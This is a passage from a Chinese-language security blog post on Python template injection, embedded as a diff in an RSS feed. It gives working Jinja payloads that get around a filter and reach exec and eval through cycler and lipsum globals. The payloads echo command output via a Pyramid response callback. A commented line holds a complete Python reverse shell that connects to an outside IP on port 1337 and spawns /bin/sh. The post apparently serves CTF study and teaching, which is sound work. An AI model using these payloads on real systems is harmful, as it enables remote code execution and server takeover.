+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 这里可以看到，渲染的结果是没有被返回的，也就是不存在回显，再分析一下waf&lt;/p>
+&lt;p>%：也就是把if，set给ban，上一个示例的方法也就行不通了。&lt;/p>
+&lt;p>length,count,[0-9],soft：把关键字和数字ban掉了，数字这里可以用request+int来绕，不过也可以采用不需要数字的方法来绕。&lt;/p>
+&lt;p>..：这里是把&amp;rsquo;.&amp;lsquo;给ban了，可以用中括号绕也可以用|attr绕过。&lt;/p>
+&lt;p>​ 这里着重介绍钩子函数回显，先构造payload：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="n">cycler&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__init__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__globals__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__builtins__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;exec&amp;#39;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s2">&amp;#34;request.add_response_callback(lambda&lt;/span>&lt;span class="si">%20r&lt;/span>&lt;span class="s2">equest,response:setattr(response,&amp;#39;text&amp;#39;,__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;whoami&amp;#39;).read()))&amp;#34;&lt;/span>&lt;span class="p">,{&lt;/span>&lt;span class="s1">&amp;#39;request&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="p">})}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 解析：这里是通过内置方法cycler，初始化，获取全区变量，获取所有内置函数，来获取exec方法，然后传入参数：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;request.add_response_callback(lambda&lt;/span>&lt;span class="si">%20r&lt;/span>&lt;span class="s2">equest,response:setattr(response,&amp;#39;text&amp;#39;,__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;whoami&amp;#39;).read()))&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;request&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 其中exec是一个执行python代码的方法，所这里的字符串就是要执行的python代码，这里的request就是要执行的python代码要传入的参数，这里的大意是，执行request类下的add_reponse_callback方法，前面是请求体，后面的response则是设置响应体和设置响应体的结果，这样就会将结果直接返回到前端中。接下来我们绕过一下&amp;rsquo;.&amp;rsquo;&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="n">cycler&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;__init__&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;__globals__&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;exec&amp;#39;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s2">&amp;#34;getattr(request,&amp;#39;add_response_callback&amp;#39;)(lambda&lt;/span>&lt;span class="si">%20r&lt;/span>&lt;span class="s2">equest,response:setattr(response,&amp;#39;text&amp;#39;,getattr(getattr(__import__(&amp;#39;os&amp;#39;),&amp;#39;popen&amp;#39;)(&amp;#39;whoami&amp;#39;),&amp;#39;read&amp;#39;)()))&amp;#34;&lt;/span>&lt;span class="p">,{&lt;/span>&lt;span class="s1">&amp;#39;request&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="p">})}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218162320046.png"
+width="1247"
+height="326"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218162320046_hu2887403464420377500.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218162320046_hu14075437831242865532.png 1024w"
+loading="lazy"
+alt="image-20241218162320046"
+class="gallery-image"
+data-flex-grow="382"
+data-flex-basis="918px"
+>&lt;/p>
+&lt;h4 id="反弹shell">反弹shell
+&lt;/h4>&lt;p>​ 这种方式的前提是靶机能出网，我们使用上一个示例，构造payload，这里不再详细解析了：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="n">lipsum&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;__globals__&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;__getitem__&amp;#39;&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="s1">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;__getitem__&amp;#39;&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="s1">&amp;#39;eval&amp;#39;&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;get&amp;#39;&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="s1">&amp;#39;shell&amp;#39;&lt;/span>&lt;span class="p">))}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#post传参&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#shell=__import__(&amp;#39;os&amp;#39;).system(&amp;#39;python3 -c \&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;61.139.2.128&amp;#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&amp;#34;/bin/sh&amp;#34;)\&amp;#39;&amp;#39;)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ &lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218162908445.png"
+width="747"
+height="575"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218162908445_hu16628332968781278973.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218162908445_hu16155223858788061469.png 1024w"
+loading="lazy"
+alt="image-20241218162908445"
+class="gallery-image"
+data-flex-grow="129"
+data-flex-basis="311px"
+>&lt;/p>
+&lt;p>​ &lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218162944530.png"
+width="552"
+height="115"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218162944530_hu16941037757783065575.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218162944530_hu9782761422789360948.png 1024w"
+loading="lazy"
+alt="image-20241218162944530"
+class="gallery-image"
+data-flex-grow="480"
+data-flex-basis="1152px"
+>&lt;/p>
+&lt;h2 id="参考文献">参考文献
+&lt;/h2>&lt;p>&lt;a class="link" href="https://blog.csdn.net/2301_76690905/article/details/134301620?ops_request_misc=%7B%22request%5Fid%22%3A%22ebffad6090e65ad2a71a5b5fdc9acae6%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;amp;request_id=ebffad6090e65ad2a71a5b5fdc9acae6&amp;amp;biz_id=0&amp;amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-134301620-null-null.142%5ev100%5epc_search_result_base6&amp;amp;utm_term=python%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%e7%bb%95%e8%bf%87&amp;amp;spm=1018.2226.3001.4187" target="_blank" rel="noopener"
+>最全SSTI模板注入waf绕过总结（6700+字数！）_ssti注入绕过-CSDN博客&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://xz.aliyun.com/t/6885?time__1311=n4%2BxnD0Dg7excGDRDBqroGkDu7Qfpte4Dk0eD" target="_blank" rel="noopener"
+>Python模板注入(SSTI)深入学习 - 先知社区&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://blog.csdn.net/weixin_43995419/article/details/126811287" target="_blank" rel="noopener"
+>Python Flask SSTI 之 长度限制绕过_python绕过长度限制的内置函数-CSDN博客&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://hadagaga.github.io/p/%e7%ac%ac%e5%8d%81%e5%85%ab%e5%b1%8a%e5%85%a8%e5%9b%bd%e5%a4%a7%e5%ad%a6%e7%94%9f%e4%bf%a1%e6%81%af%e5%ae%89%e5%85%a8%e7%ab%9e%e8%b5%9b%e5%88%9b%e6%96%b0%e5%ae%9e%e8%b7%b5%e8%83%bd%e5%8a%9b%e8%b5%9b%e6%9a%a8%e7%ac%ac%e4%ba%8c%e5%b1%8a%e9%95%bf%e5%9f%8e%e6%9d%af%e9%93%81%e4%ba%ba%e4%b8%89%e9%a1%b9%e8%b5%9b%e9%98%b2%e6%8a%a4%e8%b5%9b%e4%b8%aa%e4%ba%bawp/" target="_blank" rel="noopener"
+>第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）个人WP&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/narr/hooks.html" target="_blank" rel="noopener"
+>https://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/narr/hooks.html&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://blog.csdn.net/uuzeray/article/details/144333686" target="_blank" rel="noopener"
+>【Web】2024“国城杯”网络安全挑战大赛题解-CSDN博客&lt;/a>&lt;/p></description></item></channel></rss>
